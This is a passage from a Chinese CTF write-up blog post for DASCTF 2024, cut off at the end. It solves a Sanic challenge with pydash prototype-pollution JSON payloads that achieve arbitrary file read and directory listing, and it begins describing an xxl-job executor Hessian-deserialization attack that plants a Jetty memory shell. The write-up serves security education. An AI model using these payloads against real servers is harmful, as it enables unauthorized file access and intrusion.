---
title: DASCTF 2024暑期挑战赛wp - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18449770
source: 博客园 - 渗透测试中心
date: 2024-10-08
fetch_date: 2025-10-06T18:51:02.508753
---

# DASCTF 2024暑期挑战赛wp - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [DASCTF 2024暑期挑战赛wp](https://www.cnblogs.com/backlion/p/18449770 "发布于 2024-10-07 09:26")

## WEB

### 题目：Sanic's revenge

解题步骤

首先看到给出的附件:

from sanic import Sanic

import os

from sanic.response import text, html

import sys

import random

import pydash

# pydash==5.1.2

# 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密

class Pollute:

    def \_\_init\_\_(self):

        pass

app = Sanic(\_\_name\_\_)

app.static("/static/", "./static/")

@app.route("/\*\*\*\*\*secret\*\*\*\*\*\*\*\*")

async def secret(request):

    secret='\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*'

    return text("can you find my route name ???"+secret)

@app.route('/', methods=['GET', 'POST'])

async def index(request):

    return html(open('static/index.html').read())

@app.route("/pollute", methods=['GET', 'POST'])

async def POLLUTE(request):

    key = request.json['key']

    value = request.json['value']

    if key and value and type(key) is str and 'parts' not in key and 'proc' not in str(value) and type(value) is not list:

        pollute = Pollute()

        pydash.set\_(pollute, key, value)

        return text("success")

    else:

        log\_dir = create\_log\_dir(6)

        log\_dir\_bak = log\_dir + ".."

        log\_file = "/tmp/" + log\_dir + "/access.log"

        log\_file\_bak = "/tmp/" + log\_dir\_bak + "/access.log.bak"

        log = 'key: ' + str(key) + '|' + 'value: ' + str(value);

        # 生成日志文件

        os.system("mkdir /tmp/" + log\_dir)

        with open(log\_file, 'w') as f:

            f.write(log)

        # 备份日志文件

        os.system("mkdir /tmp/" + log\_dir\_bak)

        with open(log\_file\_bak, 'w') as f:

            f.write(log)

        return text("！！！此地禁止胡来，你的非法操作已经被记录！！！")

if \_\_name\_\_ == '\_\_main\_\_':

    app.run(host='0.0.0.0')

分析一下源代码:

/pollute路由提供了一个污染点pydash.set\_，通过传参key和value可以实现原型链污染。此外这个路由还设置了一个waf，如果触发了waf，就会将key和value的值写入/tmp目录下的文件中

还存在一个未知名称的路由，我们可以猜测里面放了secret ？？？

根据提示可以发现，这里的源码并不完整，所以我们需要得到完整的源码

这里的入口点就是原型链污染，我们污染file\_or\_directory到根目录下，就可以实现任意文件读取

我们接着想办法获取源代码文件名,尝试访问/static/proc/1/cmdline:

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241007092501905-1381800438.png)

接着访问/start.sh:

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241007092502596-882819269.png)

得到源码名称:2Q17A58T9F65y5i8.py

访问/app/2Q17A58T9F65y5i8.py,得到完整源码:

from sanic import Sanic

import os

from sanic.response import text, html

import sys

import random

import pydash

# pydash==5.1.2

#源码好像被admin删掉了一些，听他说里面藏有大秘密

class Pollute:

    def \_\_init\_\_(self):

        pass

def create\_log\_dir(n):

        ret = ""

        for i in range(n):

            num = random.randint(0, 9)

            letter = chr(random.randint(97, 122))

            Letter = chr(random.randint(65, 90))

            s = str(random.choice([num, letter, Letter]))

            ret += s

        return ret

app = Sanic(\_\_name\_\_)

app.static("/static/", "./static/")

@app.route("/Wa58a1qEQ59857qQRPPQ")

async def secret(request):

    with open("/h111int",'r') as f:

       hint=f.read()

    return text(hint)

@app.route('/', methods=['GET', 'POST'])

async def index(request):

    return html(open('static/index.html').read())

@app.route("/adminLook", methods=['GET'])

async def AdminLook(request):

    #方便管理员查看非法日志

    log\_dir=os.popen('ls /tmp -al').read();

    return text(log\_dir)

@app.route("/pollute", methods=['GET', 'POST'])

async def POLLUTE(request):

    key = request.json['key']

    value = request.json['value']

    if key and value and type(key) is str and 'parts' not in key and 'proc' not in str(value) and type(value) is not list:

        pollute = Pollute()

        pydash.set\_(pollute, key, value)

        return text("success")

    else:

        log\_dir=create\_log\_dir(6)

        log\_dir\_bak=log\_dir+".."

        log\_file="/tmp/"+log\_dir+"/access.log"

        log\_file\_bak="/tmp/"+log\_dir\_bak+"/access.log.bak"

        log='key: '+str(key)+'|'+'value: '+str(value);

        #生成日志文件

        os.system("mkdir /tmp/"+log\_dir)

        with open(log\_file, 'w') as f:

             f.write(log)

        #备份日志文件

        os.system("mkdir /tmp/"+log\_dir\_bak)

        with open(log\_file\_bak, 'w') as f:

             f.write(log)

        return text("！！！此地禁止胡来，你的非法操作已经被记录！！！")

if \_\_name\_\_ == '\_\_main\_\_':

    app.run(host='0.0.0.0')

可以看到多出来的路由:Wa58a1qEQ59857qQRPPQ，我们直接访问得到hint：

flag in /app,but you need to find his name！！！

Find a way to see the file names in the app directory

这里提示我们flag文件在app目录下，只是不知道flag名字

那么很明显我们需要想办法列出app目录下的文件

还看到adminLook路由可以看到/tmp目录下的文件，而我们的非法日志就记录在此目录下，我们先随便触发一次非法记录,接着访问adminLook路由:

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241007092503306-864833807.jpg)

可以看到这里存在两个目录，一个备份目录名称为ddahJ6..，那么就可以利用访问这个目录实现穿越到上层目录：

{"key":"\_\_class\_\_\\\\.\_\_init\_\_\\\\.\_\_globals\_\_\\\\.app.router.name\_index.\_\_mp\_main\_\_\\.static.handler.keywords.file\_or\_directory","value": "/tmp"}

首先切换到tmp目录下，再污染base的值:

{"key":"\_\_class\_\_\\\\.\_\_init\_\_\\\\.\_\_globals\_\_\\\\.app.router.name\_index.\_\_mp\_main\_\_\\.static.handler.keywords.directory\_handler.base","value": "static/ddahJ6"}

同时记得开启列目录功能:

{"key":"\_\_class\_\_\\\\.\_\_init\_\_\\\\.\_\_globals\_\_\\\\.app.router.name\_index.\_\_mp\_main\_\_\\.static.handler.keywords.directory\_handler.directory\_view","value": True}

接着访问即可:

![](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241007092503888-2101886537.png)

可以看到flag名称，接着访问/app/45W698WqtsgQT1\_flag即可得到flag

### 题目：EasyJob

解题步骤

根据附件可以确认是xxl-job-executor未授权访问的漏洞，参考下列链接：

<https://github.com/Threekiii/Vulhub-Reproduce/blob/master/XXL-JOB%20executor%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md>

但是会发现咱们的xxl-job版本比较老，属于需要靠Hessian反序列化去触发的版本，并且题目是不出网的。这时候就避免不了打一个内存马。因此这一题的关键点其实是如何去注入一个无Web依赖的Jetty内存马。

在xxljob中内置了一个handler如下

//

// Source code recreated from a .class file by IntelliJ IDEA

// (powered by FernFlower decompiler)

//

package com.xxl.job.core.rpc.netcom.jetty.server;

import com.xxl.job.core.rpc.codec.RpcRequest;

import com.xxl.job.core.rpc....